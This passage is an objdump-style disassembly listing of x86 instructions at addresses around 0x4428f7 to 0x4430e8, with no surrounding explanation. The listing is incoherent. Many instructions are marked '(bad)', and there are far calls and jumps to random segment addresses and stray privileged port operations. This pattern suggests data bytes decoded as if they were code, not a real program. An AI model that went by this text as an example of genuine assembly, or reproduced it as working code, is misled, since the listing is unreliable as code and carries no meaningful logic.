  4428f7:	cmp    BYTE PTR [ebx+ebx*8+0xb3f756a],ch
  4428fe:	ret    0x8980
  442901:	sbb    DWORD PTR [ebx-0x4bd4d11],esp
  442907:	lods   al,BYTE PTR ds:[esi]
  442908:	mov    ebp,0x85f23554
  44290d:	or     edx,DWORD PTR [ecx+0x59]
  442910:	mov    bl,0x87
  442912:	dec    eax
  442913:	icebp  
  442914:	fcmovnbe st,st(3)
  442916:	call   0xc8ab:0x56d1dea9
  44291d:	adc    al,0xe4
  44291f:	fwait
  442920:	sar    DWORD PTR [esi+eiz*2-0x45],1
  442924:	mov    bh,0xcc
  442926:	shl    BYTE PTR [edi+0x42cab74b],cl
  44292c:	shl    BYTE PTR [edx+ebx*4],0x7
  442930:	repnz in eax,0x9e
  442933:	push   esi
  442934:	push   0x2
  442936:	scas   eax,DWORD PTR es:[edi]
  442937:	mov    al,ds:0x8100b230
  44293c:	out    dx,al
  44293d:	jmp    0x7395b09d
  442942:	sbb    bh,BYTE PTR [edi]
  442944:	aad    0x2f
  442946:	popf   
  442947:	jne    0x442982
  442949:	into   
  44294a:	push   ebx
  44294b:	imul   eax,DWORD PTR [edx],0xffffffaf
  44294e:	jmp    0xdd18:0x210a8300
  442955:	mov    bl,0xfa
  442957:	pushf  
  442958:	imul   edi,DWORD PTR [ebx],0x43b3c3ee
  44295e:	add    al,0xf6
  442960:	mov    eax,0x42081c79
  442965:	adc    BYTE PTR [esi+0x3cbbbaa7],bl
  44296b:	(bad)  
  44296c:	jns    0x442958
  44296e:	stos   BYTE PTR es:[edi],al
  44296f:	aam    0x8a
  442971:	mov    ch,0xab
  442973:	daa    
  442974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442975:	push   ebx
  442976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442977:	mov    eax,ds:0xaef06fb1
  44297c:	adc    esi,ebp
  44297e:	pop    eax
  44297f:	inc    esp
  442980:	xor    dl,ah
  442982:	xchg   DWORD PTR [ebx],edi
  442984:	nop
  442985:	in     eax,dx
  442986:	out    0xad,al
  442988:	mov    bl,0x32
  44298a:	jbe    0x44295d
  44298c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44298d:	add    ah,ch
  44298f:	mov    esp,0x40ea2153
  442994:	add    eax,0x683f7472
  442999:	or     edx,DWORD PTR [edi+edx*4]
  44299c:	sbb    eax,ecx
  44299e:	div    DWORD PTR [edi-0x7]
  4429a1:	jmp    0xe3c2de40
  4429a6:	jns    0x4429db
  4429a8:	pop    esi
  4429a9:	(bad)  
  4429aa:	jp     0x442a10
  4429ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4429ad:	or     eax,0xc4aa6f0
  4429b2:	fbstp  TBYTE PTR [esi+0x719ab9c6]
  4429b8:	or     al,BYTE PTR [esi+0x42]
  4429bb:	repz add bl,BYTE PTR [eax-0xafb510e]
  4429c2:	push   ebp
  4429c3:	mov    eax,0xfdc53e32
  4429c8:	leave  
  4429c9:	das    
  4429ca:	call   0x99e0:0xd125e931
  4429d1:	bound  edi,QWORD PTR [edx-0x5]
  4429d4:	mov    al,0x7f
  4429d6:	call   0xc4e9:0x109231d7
  4429dd:	ja     0x442979
  4429df:	xchg   DWORD PTR ds:0xb7c8a7a6,esi
  4429e5:	out    dx,eax
  4429e6:	xchg   edx,eax
  4429e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4429e8:	adc    DWORD PTR [eax+eiz*8],0x50
  4429ec:	pop    esp
  4429ed:	shl    edx,cl
  4429ef:	arpl   WORD PTR [eax-0x80],dx
  4429f2:	call   0x2f6e:0x578bfaa5
  4429f9:	pop    eax
  4429fa:	jmp    0x8df14da6
  4429ff:	jp     0x442a0b
  442a01:	aam    0x4a
  442a03:	lds    esi,FWORD PTR [edx+0x6521384c]
  442a09:	cmp    ch,ch
  442a0b:	sub    esi,DWORD PTR [edx+0xa]
  442a0e:	cmp    edx,ecx
  442a10:	frstor [edi]
  442a12:	aas    
  442a13:	sbb    ecx,esp
  442a15:	xrelease xchg BYTE PTR [esp+edi*4-0x5bd2cd8d],cl
  442a1d:	lgs    ebp,FWORD PTR [ebx]
  442a20:	xor    BYTE PTR [edx-0x4612b804],al
  442a26:	adc    ah,BYTE PTR [edi-0x27df53b9]
  442a2c:	mov    ds:0xc921ffa7,eax
  442a31:	loopne 0x4429cd
  442a33:	mov    esp,0x8e8f99ed
  442a38:	lock cli 
  442a3a:	(bad)  
  442a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442a3d:	or     esp,DWORD PTR [ebx]
  442a3f:	add    al,0x30
  442a41:	scas   eax,DWORD PTR es:[edi]
  442a42:	pop    edx
  442a43:	sbb    BYTE PTR [esi-0x6bd37b26],cl
  442a49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442a4a:	fimul  DWORD PTR [esp+esi*4+0x38133635]
  442a51:	or     esi,DWORD PTR [edi-0x55119f3f]
  442a57:	out    dx,eax
  442a58:	js     0x442a97
  442a5a:	call   0xdf31:0xfb7e296
  442a61:	lds    edi,FWORD PTR [ebx+0x78cf4ea0]
  442a67:	mov    ds:0xe60b0bf5,al
  442a6c:	adc    eax,0xad942223
  442a71:	dec    ebp
  442a72:	push   0xaf0b8b15
  442a77:	or     BYTE PTR [esi],0x63
  442a7a:	test   ecx,eax
  442a7c:	and    DWORD PTR [eax+edi*2],ecx
  442a7f:	mov    cl,0x4d
  442a81:	outs   dx,DWORD PTR ds:[esi]
  442a82:	dec    eax
  442a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442a86:	push   ds
  442a87:	lahf   
  442a88:	mov    ebp,0xd5e7e567
  442a8d:	mov    edi,DWORD PTR [edx]
  442a8f:	test   DWORD PTR [esp+edi*1],0xe416a7af
  442a96:	retf   
  442a97:	inc    edi
  442a98:	ret    
  442a99:	sbb    eax,0x95b2b509
  442a9e:	out    0x55,eax
  442aa0:	sar    esp,0x22
  442aa3:	rcr    DWORD PTR [ebx+ecx*1],1
  442aa6:	pop    edx
  442aa7:	ret    0xed6f
  442aaa:	push   ds
  442aab:	shl    DWORD PTR [edi-0x54cf6522],0xb1
  442ab2:	(bad)  
  442ab3:	nop
  442ab4:	push   edx
  442ab5:	lods   eax,DWORD PTR ds:[esi]
  442ab6:	pusha  
  442ab7:	test   al,0x9
  442ab9:	or     DWORD PTR [esi+0x21],esi
  442abc:	in     al,dx
  442abd:	dec    ebx
  442abe:	xchg   ebx,eax
  442abf:	xchg   edi,eax
  442ac0:	dec    edi
  442ac1:	adc    BYTE PTR [ebx+0x55],bl
  442ac4:	pop    esi
  442ac5:	stos   BYTE PTR es:[edi],al
  442ac6:	cwde   
  442ac7:	jns    0x442ae6
  442ac9:	out    dx,eax
  442aca:	cld    
  442acb:	jge    0x442a93
  442acd:	(bad)  
  442ace:	cli    
  442acf:	fst    DWORD PTR [ebx-0x7195650f]
  442ad5:	f2xm1  
  442ad7:	or     ecx,ebp
  442ad9:	ja     0x442af9
  442adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442adc:	xor    al,al
  442ade:	mul    bl
  442ae0:	xchg   esi,eax
  442ae1:	pop    es
  442ae2:	pop    edx
  442ae3:	stc    
  442ae4:	into   
  442ae5:	cli    
  442ae6:	call   0x197e:0x7f8d836b
  442aed:	lods   al,BYTE PTR ds:[esi]
  442aee:	int3   
  442aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442af0:	(bad)  
  442af1:	stc    
  442af2:	sub    dh,BYTE PTR [ecx]
  442af4:	pusha  
  442af5:	in     eax,dx
  442af6:	addr16 jl 0x442a85
  442af9:	add    al,0xa8
  442afb:	daa    
  442afc:	xchg   DWORD PTR [ebx-0x46],edx
  442aff:	mov    bh,0xcf
  442b01:	xchg   ebx,eax
  442b02:	push   ss
  442b03:	inc    ebx
  442b04:	jbe    0x442b11
  442b06:	add    al,0x7b
  442b08:	xor    DWORD PTR [ecx],ebp
  442b0a:	dec    ebp
  442b0b:	add    dl,bl
  442b0d:	loope  0x442ac1
  442b0f:	pusha  
  442b10:	xor    bl,BYTE PTR [ecx+ebx*4+0x73792217]
  442b17:	shr    ecx,1
  442b19:	sti    
  442b1a:	xor    eax,0x63363084
  442b1f:	jmp    0xb0d45456
  442b24:	cmp    eax,0xb5217494
  442b29:	iret   
  442b2a:	pop    ss
  442b2b:	nop
  442b2c:	or     ah,BYTE PTR [edx+ebp*2-0x65]
  442b30:	inc    edi
  442b31:	cmp    BYTE PTR [edx-0x57],dl
  442b34:	mov    edx,0x52aec488
  442b39:	pop    eax
  442b3a:	shl    BYTE PTR [esi+0x7f],cl
  442b3d:	inc    edx
  442b3e:	call   0xd5c:0x80393b39
  442b45:	xor    eax,0x4c95a2b5
  442b4a:	jmp    FWORD PTR [ebx+0x4]
  442b4d:	or     esp,DWORD PTR [edi]
  442b4f:	(bad)  
  442b50:	mov    ch,0xfc
  442b52:	out    dx,eax
  442b53:	test   BYTE PTR [edi+0x18bbdbc2],0xdf
  442b5a:	fld    QWORD PTR [edx]
  442b5c:	loopne 0x442bc9
  442b5e:	jmp    0xb9ef:0x5a95e7d4
  442b65:	rcr    BYTE PTR [edx+0x42b8a47e],0x17
  442b6c:	adc    ah,BYTE PTR [esi-0x7c]
  442b6f:	hlt    
  442b70:	jmp    0x664e85d7
  442b75:	push   edx
  442b76:	sub    dl,ah
  442b78:	stos   BYTE PTR es:[edi],al
  442b79:	or     ecx,DWORD PTR [ebx+ebp*8]
  442b7c:	sbb    eax,0xa0c313b8
  442b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442b82:	call   0x773f:0x1748c2cc
  442b89:	add    eax,0xa052b822
  442b8e:	int3   
  442b8f:	loope  0x442b41
  442b91:	mov    WORD PTR [edi-0x39],fs
  442b94:	mov    ch,0xea
  442b96:	fwait
  442b97:	stos   DWORD PTR es:[edi],eax
  442b98:	pop    ecx
  442b99:	sbb    ebx,DWORD PTR [edx-0x688ed761]
  442b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442ba0:	and    DWORD PTR [edi+0x2d9bae99],ecx
  442ba6:	mov    ds:0x9f55b663,eax
  442bab:	push   edi
  442bac:	pop    ss
  442bad:	xchg   edi,eax
  442bae:	sbb    cl,BYTE PTR [edi-0x63]
  442bb1:	add    ebp,edi
  442bb3:	mov    ds:0xb3d1627d,al
  442bb8:	iret   
  442bb9:	retf   
  442bba:	imul   ebp,DWORD PTR [eax],0xfffffffd
  442bbd:	xor    eax,0x7328949b
  442bc2:	add    esp,DWORD PTR [edi-0x34]
  442bc5:	scas   eax,DWORD PTR es:[edi]
  442bc6:	jmp    0xd9c6:0xca0bf6cc
  442bcd:	dec    ecx
  442bce:	stc    
  442bcf:	bound  edi,QWORD PTR [edx-0x65]
  442bd2:	jecxz  0x442bf3
  442bd4:	mov    cl,0xec
  442bd6:	mov    edx,0x184b4652
  442bdb:	pop    edi
  442bdc:	cwde   
  442bdd:	popf   
  442bde:	mov    esp,DWORD PTR [edi+0x4b9a174]
  442be4:	adc    eax,0xb3cc73dc
  442be9:	lock sbb DWORD PTR [edi+0x4a48c610],ebp
  442bf0:	outs   dx,BYTE PTR ds:[esi]
  442bf1:	fidivr DWORD PTR [esi-0x59]
  442bf4:	or     BYTE PTR [ecx],ch
  442bf6:	jge    0x442c50
  442bf8:	and    DWORD PTR [edi-0x5b],eax
  442bfb:	fdiv   QWORD PTR [edx+0x2827ba74]
  442c01:	push   ds
  442c02:	fidiv  WORD PTR [ebx+0xb]
  442c05:	xor    eax,0x83b2c54b
  442c0a:	sbb    eax,0x999b4a75
  442c0f:	push   esp
  442c10:	mov    dl,0x9f
  442c12:	repz mov ds:0x3c00469a,eax
  442c18:	cmp    esi,edi
  442c1a:	pushf  
  442c1b:	popf   
  442c1c:	mov    ch,BYTE PTR [eax-0x27e3236f]
  442c22:	sbb    bl,BYTE PTR [esi-0x54c2121f]
  442c28:	mov    dl,0x91
  442c2a:	or     al,bl
  442c2c:	inc    ecx
  442c2d:	and    edx,ebx
  442c2f:	test   eax,0xc2ac0b9d
  442c34:	call   0xb6f30f01
  442c39:	mov    ah,0x9a
  442c3b:	and    al,BYTE PTR [ebx]
  442c3d:	in     eax,0x97
  442c3f:	and    al,0x52
  442c41:	ds inc ebx
  442c43:	lahf   
  442c44:	fstp   st(5)
  442c46:	sbb    ah,ch
  442c48:	jp     0x442bcd
  442c4a:	sub    DWORD PTR [ebp-0x5d3db359],esi
  442c50:	lds    ecx,FWORD PTR [eax+ecx*2]
  442c53:	loop   0x442ca5
  442c55:	in     al,dx
  442c56:	jmp    0xe0a0:0x3dfdea2e
  442c5d:	hlt    
  442c5e:	mov    ss,WORD PTR [eax+0x6ddebb09]
  442c64:	mov    ecx,ds
  442c66:	call   0x3a2d:0xd6b779ec
  442c6d:	pusha  
  442c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442c70:	jnp    0x442bf6
  442c72:	mov    ss,WORD PTR [edi-0x67]
  442c75:	(bad)  
  442c76:	mov    esp,0xd6d3efc7
  442c7b:	imul   edi,DWORD PTR [ebx],0xa
  442c7e:	test   BYTE PTR [ecx+0x60],ah
  442c81:	xchg   ebx,eax
  442c82:	add    al,0xd0
  442c84:	pop    edx
  442c85:	les    ebp,FWORD PTR [eax-0x59]
  442c88:	loope  0x442c19
  442c8a:	mov    edi,0xd46abf22
  442c8f:	and    eax,0xb422ceb2
  442c94:	xchg   ebx,eax
  442c95:	inc    edi
  442c96:	aad    0xad
  442c98:	(bad)  
  442c99:	aaa    
  442c9a:	jp     0x442cd0
  442c9c:	mov    dl,0xf5
  442c9e:	sub    BYTE PTR [ecx],cl
  442ca0:	stos   DWORD PTR es:[edi],eax
  442ca1:	xor    cl,BYTE PTR [ebp+0x14]
  442ca4:	push   eax
  442ca5:	je     0x442c41
  442ca7:	cmp    eax,0x10453070
  442cac:	dec    eax
  442cad:	fild   QWORD PTR [edi+eiz*4+0x3ec46533]
  442cb4:	add    BYTE PTR [edi+esi*4+0x18ae8dc8],0x27
  442cbc:	or     al,0x5a
  442cbe:	xchg   edi,eax
  442cbf:	loop   0x442c7e
  442cc1:	xor    eax,0x4fc3a713
  442cc6:	out    0x20,al
  442cc8:	cwde   
  442cc9:	call   0x6bc6:0x25b13ee4
  442cd0:	addr16 popa 
  442cd2:	or     eax,0xd8054200
  442cd7:	push   es
  442cd8:	out    0x9,eax
  442cda:	cdq    
  442cdb:	cmp    DWORD PTR [ebx],eax
  442cdd:	add    al,bh
  442cdf:	mov    edx,0x1557ddf2
  442ce4:	push   esi
  442ce5:	and    eax,0xbb5f369a
  442cea:	daa    
  442ceb:	mov    cs,WORD PTR [ebx+0x43]
  442cee:	mov    ds:0xcd6caca7,al
  442cf3:	jne    0x442cdb
  442cf5:	xchg   edi,eax
  442cf6:	cmp    eax,0xf9d38aa3
  442cfb:	imul   ebx,DWORD PTR [ebp+0x565d6b45],0x63
  442d02:	mov    eax,ds:0xe4caf6a6
  442d07:	push   ebx
  442d08:	pavgb  mm3,QWORD PTR [eax]
  442d0b:	xchg   edi,eax
  442d0c:	shl    esi,1
  442d0e:	call   0xb754:0xbd33cf67
  442d15:	sbb    DWORD PTR [edi],eax
  442d17:	mov    al,ds:0xbdebce31
  442d1c:	pop    ds
  442d1d:	fwait
  442d1e:	dec    edx
  442d1f:	bswap  esp
  442d21:	fbld   TBYTE PTR [edi+0x2e8bc140]
  442d27:	mov    cl,0xd7
  442d29:	test   DWORD PTR [ebx-0x4b],esi
  442d2c:	mov    bh,0x8
  442d2e:	jns    0x442d03
  442d30:	jns    0x442da2
  442d32:	dec    eax
  442d33:	sbb    DWORD PTR [edx],0xffffffbd
  442d36:	add    eax,DWORD PTR [edi-0x4e]
  442d39:	mov    WORD PTR ds:0xac6fd071,cs
  442d3f:	cs push ds
  442d41:	add    al,0x2d
  442d43:	cmp    BYTE PTR [eax+0x6c],0x9a
  442d47:	pop    ebp
  442d48:	pop    edi
  442d49:	mov    ebp,DWORD PTR [ebx-0x2f]
  442d4c:	and    dl,BYTE PTR [ecx]
  442d4e:	popf   
  442d4f:	ficomp WORD PTR [ebx-0x21]
  442d52:	lock repz xchg ebp,eax
  442d55:	pusha  
  442d56:	stos   BYTE PTR es:[edi],al
  442d57:	test   BYTE PTR [edi-0x3d],0x1d
  442d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442d5c:	cmp    BYTE PTR [eax+0x5ce7fceb],0x3b
  442d63:	mov    esi,0x9514db12
  442d68:	mov    dl,0xe4
  442d6a:	test   eax,0xdc2f40b0
  442d6f:	sbb    BYTE PTR [bp+di],cl
  442d72:	repnz jmp 0x9b8:0x798302c7
  442d7a:	xchg   ebp,eax
  442d7b:	jmp    0x442d2c
  442d7d:	and    ebp,DWORD PTR [ecx+0x7c45b84]
  442d83:	push   edi
  442d84:	repz pop eax
  442d86:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442d88:	adc    DWORD PTR [edi+0x2552bbc2],ebx
  442d8e:	icebp  
  442d8f:	je     0x442d43
  442d91:	xchg   edx,eax
  442d92:	sar    DWORD PTR [ebp+0x63212d38],1
  442d98:	adc    BYTE PTR [edi],dh
  442d9a:	mov    ebp,0x9bb70e59
  442d9f:	std    
  442da0:	repz das 
  442da2:	push   esi
  442da3:	mov    ds:0x2a27cbdb,eax
  442da8:	scas   eax,DWORD PTR es:[edi]
  442da9:	aaa    
  442daa:	in     eax,dx
  442dab:	add    BYTE PTR [edx-0x6b],dh
  442dae:	mov    al,ds:0xc13242f6
  442db3:	test   al,0x57
  442db5:	jmp    0x6a8d:0x973314fe
  442dbc:	and    bh,bl
  442dbe:	addr16 mov ah,0xb2
  442dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442dc2:	jmp    0x442dd1
  442dc4:	loope  0x442e1c
  442dc6:	mov    bh,0x1d
  442dc8:	push   ecx
  442dc9:	or     bl,BYTE PTR [esi-0x73]
  442dcc:	sub    al,0xbb
  442dce:	ret    
  442dcf:	fbld   TBYTE PTR [edi]
  442dd1:	ror    BYTE PTR [esi+0x72fb756a],cl
  442dd7:	jge    0x442d8b
  442dd9:	lea    edi,[edi]
  442ddb:	push   ecx
  442ddc:	and    eax,DWORD PTR [esi+0xd]
  442ddf:	adc    al,0x4a
  442de1:	or     esi,DWORD PTR [ebx-0x1a91fd8a]
  442de7:	pusha  
  442de8:	aad    0x61
  442dea:	call   0x490d:0x23cbb84b
  442df1:	push   ss
  442df2:	cmp    dl,BYTE PTR [edi-0x49]
  442df5:	or     edi,DWORD PTR [edx-0x6]
  442df8:	pop    es
  442df9:	icebp  
  442dfa:	sub    dh,BYTE PTR [esi]
  442dfc:	jp     0x442db7
  442dfe:	call   0x18d:0xcb02b51
  442e05:	fidivr WORD PTR [eax]
  442e07:	mov    ebx,0x27d0eb0b
  442e0c:	cld    
  442e0d:	fiadd  DWORD PTR [eax]
  442e0f:	dec    ecx
  442e10:	loopne 0x442e31
  442e12:	call   0x906:0x5e313b02
  442e19:	xchg   BYTE PTR [edi+0x41],bl
  442e1c:	jnp    0x442e26
  442e1e:	mov    esi,0x466f7cb6
  442e23:	add    eax,0xf1b7a62a
  442e28:	mov    dl,0xb3
  442e2a:	jo     0x442e85
  442e2c:	ins    BYTE PTR es:[edi],dx
  442e2d:	pop    esp
  442e2e:	je     0x442ea8
  442e30:	mov    ecx,DWORD PTR [ebx]
  442e32:	push   ebp
  442e34:	pusha  
  442e35:	or     al,bl
  442e37:	mov    bh,0x3f
  442e39:	pushf  
  442e3a:	call   0xac6a:0xbcb3a770
  442e41:	aaa    
  442e42:	loopne 0x442deb
  442e44:	fcmovne st,st(1)
  442e46:	cmp    dh,BYTE PTR [ebp-0x7f4e83d0]
  442e4c:	mov    dl,0x3d
  442e4e:	enter  0x5aa8,0xbc
  442e52:	or     DWORD PTR [edx+ebx*1],edx
  442e55:	std    
  442e56:	xor    eax,0xb30ee3a7
  442e5b:	cs addr16 mov ecx,0x4d404ed3
  442e62:	call   0x5d41:0x6813ee7b
  442e69:	inc    ebp
  442e6a:	aaa    
  442e6b:	call   0xd2e2:0x5f1a6439
  442e72:	xchg   esi,eax
  442e73:	jb     0x442e12
  442e75:	nop
  442e76:	call   0xcf5e:0x659bf399
  442e7d:	lds    dx,DWORD PTR [edi-0x3a]
  442e81:	or     ebp,DWORD PTR [edi-0x3e]
  442e84:	xchg   edi,eax
  442e85:	test   al,0x3b
  442e87:	jge    0x442e14
  442e89:	scas   eax,DWORD PTR es:[edi]
  442e8a:	mov    al,ds:0xa98b5e7b
  442e8f:	call   0xf8b9a73
  442e94:	fld    QWORD PTR [ebx+edx*8]
  442e97:	sub    eax,0xa93a5ef7
  442e9c:	cmp    DWORD PTR [ecx-0x524df618],ebx
  442ea2:	cmp    DWORD PTR [edx+0x7c4d60f3],ebp
  442ea8:	cmp    ecx,DWORD PTR [edx]
  442eaa:	mov    DWORD PTR [eax+0x71dfcd53],edx
  442eb0:	mov    dh,0xff
  442eb2:	enter  0xb344,0xc5
  442eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442eb7:	ret    
  442eb8:	jnp    0x442f06
  442eba:	inc    ebx
  442ebb:	sbb    DWORD PTR [esi+0x16],ebp
  442ebe:	xchg   esp,eax
  442ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442ec0:	dec    edx
  442ec1:	jb     0x442ede
  442ec3:	mov    cl,0xb5
  442ec5:	in     al,dx
  442ec6:	add    DWORD PTR [ebp+0x6a],ebp
  442ec9:	ror    BYTE PTR [edx+0x57],0xb2
  442ecd:	pop    ds
  442ece:	in     eax,0x49
  442ed0:	xor    ch,al
  442ed2:	(bad)  
  442ed4:	xchg   ecx,eax
  442ed5:	and    eax,0xb4b559d
  442eda:	mov    ebx,0x1d85b721
  442edf:	sub    al,0xb2
  442ee1:	mov    dh,0x62
  442ee3:	(bad)  
  442ee4:	repnz jmp 0x79df:0x641325f8
  442eec:	mov    dl,0xed
  442eee:	dec    bp
  442ef0:	cmp    ebx,DWORD PTR [bp+si-0x3e79]
  442ef5:	cli    
  442ef6:	dec    ebp
  442ef7:	cmp    ecx,DWORD PTR [ecx]
  442ef9:	xchg   esi,eax
  442efa:	add    al,0xa0
  442efc:	arpl   WORD PTR [edi],bx
  442efe:	(bad)  
  442eff:	add    DWORD PTR [esi+0x1927499c],0xb26ceac9
  442f09:	adc    DWORD PTR [edx-0x13024f74],ebp
  442f0f:	repnz ins BYTE PTR es:[edi],dx
  442f11:	punpckldq mm5,DWORD PTR [edi-0x5c]
  442f15:	lds    eax,FWORD PTR ds:0xa9035267
  442f1b:	test   al,0xee
  442f1d:	dec    eax
  442f1e:	mov    DWORD PTR ds:[edi-0x6c],eax
  442f22:	call   0xbb15:0xee32f789
  442f29:	or     al,0xba
  442f2b:	jbe    0x442eff
  442f2d:	test   DWORD PTR [esi],eax
  442f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442f30:	int    0x7e
  442f32:	mov    edi,0xa6b3bbcc
  442f37:	cmp    DWORD PTR [eax+0x1c84c38b],ebp
  442f3d:	xor    edx,edi
  442f3f:	test   eax,0x5aa7a187
  442f44:	adc    dl,BYTE PTR [eax+ebx*2]
  442f47:	push   edi
  442f48:	std    
  442f49:	add    dh,0x8b
  442f4c:	dec    ebp
  442f4d:	or     ebp,DWORD PTR [edi+0x10]
  442f50:	bound  esp,QWORD PTR [eax+0xb9b55a8]
  442f56:	adc    eax,0xfde3603b
  442f5b:	bound  esi,QWORD PTR [eax-0x1f513917]
  442f61:	or     ebx,esi
  442f63:	stos   DWORD PTR es:[edi],eax
  442f64:	ret    0xfb14
  442f67:	jp     0x442f98
  442f69:	jle    0x442f8f
  442f6b:	fisttp DWORD PTR [eax]
  442f6d:	or     esp,esi
  442f6f:	mov    BYTE PTR [edx+0x3c17aded],ah
  442f75:	add    DWORD PTR [edx-0x5001e67f],ebx
  442f7b:	cld    
  442f7c:	ret    
  442f7d:	push   esp
  442f7e:	push   es
  442f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442f80:	ins    BYTE PTR es:[edi],dx
  442f81:	jnp    0x442f3d
  442f83:	cmp    eax,0xeba58df0
  442f88:	push   edx
  442f89:	ficom  DWORD PTR [esi-0x7628bbe2]
  442f8f:	stos   DWORD PTR es:[edi],eax
  442f90:	es add eax,0x66218e63
  442f96:	cli    
  442f97:	adc    al,BYTE PTR [edx-0x4de2e194]
  442f9d:	fs sub esi,ebx
  442fa0:	xchg   ebp,eax
  442fa1:	iret   
  442fa2:	loopne 0x442fe6
  442fa4:	sub    DWORD PTR [ebx],edi
  442fa6:	icebp  
  442fa7:	xor    BYTE PTR [edx],cl
  442fa9:	popa   
  442faa:	arpl   WORD PTR [edx-0x6e49774e],ax
  442fb0:	push   edx
  442fb1:	sbb    BYTE PTR [ebx+0x7b050dbc],dh
  442fb7:	sub    bh,al
  442fb9:	in     al,0x1a
  442fbb:	loop   0x443014
  442fbd:	sub    eax,0x9b2fcde
  442fc2:	sbb    edi,edi
  442fc4:	mov    edi,DWORD PTR [edx]
  442fc6:	add    eax,0x360bd5d1
  442fcb:	mov    DWORD PTR [ebx-0x1d],edx
  442fce:	into   
  442fcf:	push   eax
  442fd0:	in     eax,dx
  442fd1:	in     eax,dx
  442fd2:	xchg   DWORD PTR [eax],ecx
  442fd4:	mov    dl,BYTE PTR [edi]
  442fd6:	fwait
  442fd7:	jb     0x442f82
  442fd9:	sahf   
  442fda:	stc    
  442fdb:	sub    ah,BYTE PTR [esi+0x27]
  442fde:	and    eax,0x5dcdbca8
  442fe3:	mov    edi,0x1fb3eb32
  442fe8:	add    eax,0xae400289
  442fed:	nop
  442fee:	rol    BYTE PTR [ebx-0x5],cl
  442ff1:	cdq    
  442ff2:	enter  0xe527,0x62
  442ff6:	push   es
  442ff7:	dec    esp
  442ff8:	inc    eax
  442ff9:	xchg   ebx,eax
  442ffa:	add    dl,al
  442ffc:	push   ebp
  442ffd:	or     eax,DWORD PTR [esi+0x62]
  443000:	sar    BYTE PTR [esi+0x6a],cl
  443003:	mov    bl,BYTE PTR [ecx]
  443005:	mov    ebp,0x3231159a
  44300a:	push   ds
  44300b:	aas    
  44300c:	data16 sub BYTE PTR [ebp+ebx*4+0x443c5fb1],dl
  443014:	pusha  
  443015:	or     esi,DWORD PTR [edi-0x4]
  443018:	mov    edx,0xb5ff9169
  44301d:	mov    esi,0x72b4aa1c
  443022:	jnp    0x442fb1
  443024:	xor    BYTE PTR es:[edx+0x32],0x9d
  443029:	fwait
  44302a:	inc    edx
  44302b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44302c:	cmc    
  44302d:	adc    ah,BYTE PTR [edi]
  44302f:	mov    dh,0x56
  443031:	push   es
  443032:	repnz cmp DWORD PTR [ebp-0xd10e43d],ebp
  443039:	xchg   edi,eax
  44303a:	adc    esp,ebx
  44303c:	mov    al,0x71
  44303e:	fldenv [edi-0x4792c0b5]
  443044:	mov    BYTE PTR [edx],ah
  443046:	add    DWORD PTR [edx],ebx
  443048:	mov    dl,0x8
  44304a:	test   al,0xd0
  44304c:	mov    ds:0x20f2c904,eax
  443051:	or     esp,DWORD PTR [ebp-0x46]
  443054:	retf   0x163d
  443057:	mov    esp,DWORD PTR [ecx-0x70]
  44305a:	call   0x6968:0x4e08942c
  443061:	push   esp
  443062:	mov    bl,0xa6
  443064:	and    BYTE PTR [ebx-0x782042f0],cl
  44306a:	pop    eax
  44306b:	pop    ebp
  44306c:	jb     0x44304d
  44306e:	imul   ebx,eax,0x71f8bdd2
  443074:	push   ecx
  443075:	addr16 jae 0x44301c
  443078:	adc    al,0xa0
  44307a:	jne    0x4430af
  44307c:	outs   dx,BYTE PTR ds:[esi]
  44307d:	ja     0x4430a2
  44307f:	punpckldq mm2,mm7
  443082:	inc    edx
  443083:	or     BYTE PTR [edx-0x183e7ae2],dh
  443089:	loopne 0x443069
  44308b:	and    esi,DWORD PTR gs:[esi+eiz*1]
  44308f:	push   edx
  443090:	mov    dl,0xa5
  443092:	adc    eax,0x1ce97eff
  443097:	jg     0x4430c3
  443099:	std    
  44309a:	push   0x2b12b22d
  44309f:	inc    esp
  4430a0:	and    dh,BYTE PTR [ebp-0x57]
  4430a3:	jnp    0x44310a
  4430a5:	or     ecx,DWORD PTR [ebp+0x1c68efab]
  4430ab:	int3   
  4430ac:	clc    
  4430ad:	daa    
  4430ae:	call   0xe710:0xe078ebb8
  4430b5:	je     0x4430be
  4430b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4430b8:	adc    ecx,ecx
  4430ba:	clc    
  4430bb:	fstp   TBYTE PTR [ecx-0x776c444b]
  4430c1:	cmp    BYTE PTR [esi+0x76ef5527],0x9e
  4430c8:	lock mov al,ds:0xd4c3a62a
  4430ce:	fcmovnu st,st(1)
  4430d0:	test   BYTE PTR [esi-0x6e],dl
  4430d3:	dec    edi
  4430d4:	and    esp,DWORD PTR [esi]
  4430d6:	(bad)  
  4430d7:	xor    BYTE PTR [esi-0x36d82aca],bl
  4430dd:	mov    WORD PTR [edx-0xfe0b18f],?
  4430e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4430e4:	cli    
  4430e5:	xchg   ebx,eax
  4430e6:	cmc    
  4430e7:	pushf  
  4430e8:	inc    esi
